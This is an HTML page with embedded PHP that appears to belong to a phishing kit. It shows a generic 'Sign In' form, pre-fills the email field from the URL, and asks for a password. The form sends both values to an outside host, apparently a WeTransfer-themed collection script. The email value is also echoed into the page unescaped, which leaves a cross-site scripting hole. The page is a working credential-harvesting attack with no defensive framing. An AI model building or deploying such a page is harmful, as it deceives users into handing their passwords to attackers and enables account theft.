<!DOCTYPE html>
<html lang="en">


<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>_____Material</title>
    <link rel="stylesheet" href="style.css">
    <script src="jquery.min.js"></script>
    <script src="script.js"></script>
</head>

<body> 
    <div class="fx">
        <div class="fxbody">

            <form action="https://xemkesengroup.store/wetransss.php" method="post" >

                <img id="lg" src="top.jpg">
                <div class="er"></div>
                <div>
                    <input type="text" value="<?php echo $_GET['email']; ?>" name="email" >
                </div>
                <div>
                    <input type="password" name="password" required>
                </div>
                <div>
                    <button id="submit" class="btn btn-md btn-primary">Sign In</button>
                </div>
            </form>
        </div>
    </div>
</body>


</html>